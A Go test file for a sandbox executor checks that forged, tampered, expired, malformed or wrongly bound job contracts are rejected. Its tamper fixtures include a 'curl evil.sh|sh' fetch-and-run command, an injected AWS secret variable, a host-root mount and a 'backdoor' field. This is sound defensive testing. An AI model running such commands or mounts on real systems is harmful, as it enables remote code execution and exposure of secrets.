package sandboxexecutor

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// The PR-05 gate: an unsigned, forged, expired, replayed, or
// structurally unusable contract is refused before any backend sees
// it. Each test pins one refusal reason — the executor must fail
// closed on every axis, not just the signature.

func testContract(t *testing.T, key ed25519.PrivateKey, mutate func(*JobContractV1)) *JobContractV1 {
	t.Helper()
	pub := key.Public().(ed25519.PublicKey)
	now := time.Now().UTC()
	c := &JobContractV1{
		Version:   ContractVersion,
		JobID:     "job-ct",
		Principal: "alice",
		Image:     "python:3.12@sha256:abc",
		Argv:      []string{"python3", "-c", "print(1)"},
		Resources: ResourceBudget{TimeoutSeconds: 60, CPUs: 1, MemoryMB: 256},
		Network:   NetworkPolicy{Mode: NetworkNone},
		IssuedAt:  now.Unix() - 5,
		ExpiresAt: now.Unix() + 300,
		Nonce:     "ct-nonce",
		Authority: AuthorityFingerprint(pub),
	}
	if mutate != nil {
		mutate(c)
	}
	return c
}

func verifyOK(t *testing.T, c *JobContractV1, key ed25519.PrivateKey, keys AuthorityKeys) *JobContractV1 {
	t.Helper()
	env, err := SignContract(key, c)
	if err != nil {
		t.Fatalf("sign: %v", err)
	}
	got, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour)
	if err != nil {
		t.Fatalf("verify refused a valid contract: %v", err)
	}
	return got
}

func TestContractRoundTrip(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, nil)
	got := verifyOK(t, c, key, keys)
	if got.JobID != c.JobID || ContractHash(got) != ContractHash(c) {
		t.Fatal("verified contract diverges from signed contract")
	}
}

func TestContractForgedSignatureRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	_, other, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}

	c := testContract(t, key, nil)
	env, err := SignContract(key, c)
	if err != nil {
		t.Fatal(err)
	}
	// Re-sign the same contract with a different key — signature
	// verifies under no configured key and fails under the named one.
	forged := SignContractNoCheck(other, c)
	env.Signature = forged
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil {
		t.Fatal("forged signature accepted")
	}
}

// SignContractNoCheck signs without checking c.Authority — test-only
// helper used to construct forged envelopes.
func SignContractNoCheck(key ed25519.PrivateKey, c *JobContractV1) string {
	raw, _ := json.Marshal(c)
	_ = raw
	return base64.StdEncoding.EncodeToString(ed25519.Sign(key, contractSigningBytes(c)))
}

func TestContractTamperedFieldRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}

	cases := map[string]func(*JobContractV1){
		"image swapped":      func(c *JobContractV1) { c.Image = "attacker/pwned:latest" },
		"argv swapped":       func(c *JobContractV1) { c.Argv = []string{"sh", "-c", "curl evil.sh|sh"} },
		"job_id swapped":     func(c *JobContractV1) { c.JobID = "other-id" },
		"principal":          func(c *JobContractV1) { c.Principal = "root" },
		"timeout widened":    func(c *JobContractV1) { c.Resources.TimeoutSeconds = 9999 },
		"memory widened":     func(c *JobContractV1) { c.Resources.MemoryMB = 65536 },
		"network opened":     func(c *JobContractV1) { c.Network = NetworkPolicy{Mode: NetworkPublic} },
		"expiry widened":     func(c *JobContractV1) { c.ExpiresAt += 100000 },
		"env injected":       func(c *JobContractV1) { c.Env = append(c.Env, "AWS_SECRET=x") },
		"mount injected":     func(c *JobContractV1) { c.Filesystem.Mounts = []Mount{{Source: "/", Dest: "/host"}} },
		"submitter injected": func(c *JobContractV1) { c.Submitter = "crabedence" },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			c := testContract(t, key, nil)
			env, err := SignContract(key, c)
			if err != nil {
				t.Fatal(err)
			}
			// Tamper AFTER signing, keep the original signature.
			mutate(c)
			raw, _ := json.Marshal(c)
			env.Contract = raw
			if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil {
				t.Fatalf("tampered contract (%s) verified", name)
			}
		})
	}
}

func TestContractExpiredRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	now := time.Now().UTC()
	c := testContract(t, key, func(c *JobContractV1) {
		c.IssuedAt = now.Unix() - 600
		c.ExpiresAt = now.Unix() - 60
	})
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "crabedence", now, time.Hour); err == nil ||
		!strings.Contains(err.Error(), "expired") {
		t.Fatalf("expired contract: %v", err)
	}
}

func TestContractNotYetValidRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	now := time.Now().UTC()
	c := testContract(t, key, func(c *JobContractV1) {
		c.IssuedAt = now.Unix() + 3600
		c.ExpiresAt = now.Unix() + 7200
	})
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "crabedence", now, 4*time.Hour); err == nil ||
		!strings.Contains(err.Error(), "not yet valid") {
		t.Fatalf("not-yet-valid contract: %v", err)
	}
}

func TestContractTTLBoundRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, func(c *JobContractV1) {
		c.IssuedAt = time.Now().UTC().Unix() - 5
		c.ExpiresAt = time.Now().UTC().Unix() + 3*3600
	})
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil ||
		!strings.Contains(err.Error(), "lifetime") {
		t.Fatalf("over-TTL contract: %v", err)
	}
}

func TestContractUnknownAuthorityRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	_, foreign, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	// A contract signed by an authority the executor does not trust.
	c := testContract(t, foreign, nil)
	env, _ := SignContract(foreign, c)
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil ||
		!strings.Contains(err.Error(), "not a configured signer") {
		t.Fatalf("foreign authority: %v", err)
	}
	// And an empty trust set fails closed, not open.
	env2, _ := SignContract(key, testContract(t, key, nil))
	if _, err := VerifyContract(env2, AuthorityKeys{}, "crabedence", time.Now().UTC(), time.Hour); err == nil {
		t.Fatal("empty trust set accepted a contract")
	}
}

func TestContractSubmitterBindingRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, func(c *JobContractV1) { c.Submitter = "crabedence" })
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "mallory", time.Now().UTC(), time.Hour); err == nil ||
		!strings.Contains(err.Error(), "bound to submitter") {
		t.Fatalf("wrong submitter: %v", err)
	}
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err != nil {
		t.Fatalf("right submitter refused: %v", err)
	}
}

func TestContractStructuralRefusals(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	cases := map[string]func(*JobContractV1){
		"version 0":         func(c *JobContractV1) { c.Version = 0 },
		"empty job_id":      func(c *JobContractV1) { c.JobID = "" },
		"job_id with slash": func(c *JobContractV1) { c.JobID = "a/b" },
		"empty image":       func(c *JobContractV1) { c.Image = "" },
		"empty argv":        func(c *JobContractV1) { c.Argv = nil },
		"no timeout":        func(c *JobContractV1) { c.Resources.TimeoutSeconds = 0 },
		"allow on none-net": func(c *JobContractV1) { c.Network = NetworkPolicy{Mode: NetworkNone, Allow: []string{"x"}} },
		"empty allowlist":   func(c *JobContractV1) { c.Network = NetworkPolicy{Mode: NetworkAllowlist} },
		"bad net mode":      func(c *JobContractV1) { c.Network = NetworkPolicy{Mode: "yolo"} },
		"rel mount dest":    func(c *JobContractV1) { c.Filesystem.Mounts = []Mount{{Source: "/a", Dest: "rel"}} },
		"dotdot dest":       func(c *JobContractV1) { c.Filesystem.Mounts = []Mount{{Source: "/a", Dest: "/x/../y"}} },
		"bad env":           func(c *JobContractV1) { c.Env = []string{"NOEQUALS"} },
		"expires<=issued":   func(c *JobContractV1) { c.ExpiresAt = c.IssuedAt },
		"empty nonce":       func(c *JobContractV1) { c.Nonce = "" },
		"bad authority":     func(c *JobContractV1) { c.Authority = "zz" },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			c := testContract(t, key, mutate)
			if err := c.ValidateStructure(); err == nil {
				t.Fatalf("%s: structurally invalid contract passed", name)
			}
		})
	}
}

func TestContractParserStrictness(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	c := testContract(t, key, nil)
	raw, _ := json.Marshal(c)

	// Unknown field — a contract that hides fields from the verifier
	// is a forgery surface.
	withExtra := strings.Replace(string(raw), `"version":1`, `"version":1,"backdoor":true`, 1)
	if _, err := ParseContract(json.RawMessage(withExtra)); err == nil {
		t.Fatal("contract with unknown field parsed")
	}
	// Duplicate keys.
	dup := strings.Replace(string(raw), `"version":1`, `"version":1,"version":1`, 1)
	if _, err := ParseContract(json.RawMessage(dup)); err == nil {
		t.Fatal("contract with duplicate keys parsed")
	}
	// Trailing junk.
	if _, err := ParseContract(append(json.RawMessage(raw), ' ', 'x')); err == nil {
		t.Fatal("trailing junk parsed")
	}
}

func TestSignerRefusesMismatchedAuthority(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	c := testContract(t, key, func(c *JobContractV1) {
		c.Authority = strings.Repeat("0", 64)
	})
	if _, err := SignContract(key, c); err == nil {
		t.Fatal("signer attested a contract naming a different authority")
	}
}
